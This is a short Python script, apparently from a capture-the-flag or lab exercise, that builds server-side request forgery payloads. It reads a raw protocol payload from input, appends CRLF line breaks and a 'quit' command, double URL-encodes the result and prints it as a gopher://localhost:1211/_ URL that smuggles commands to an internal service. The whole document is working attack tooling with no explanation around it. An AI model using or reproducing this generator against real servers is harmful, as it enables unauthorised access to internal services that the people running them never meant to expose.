import urllib.parse

payload = input("insert payload:\n")
cmd=payload+"\r\nquit\r\n\r\n"
print("gopher://localhost:1211/_",end="")
print(urllib.parse.quote(urllib.parse.quote(cmd)))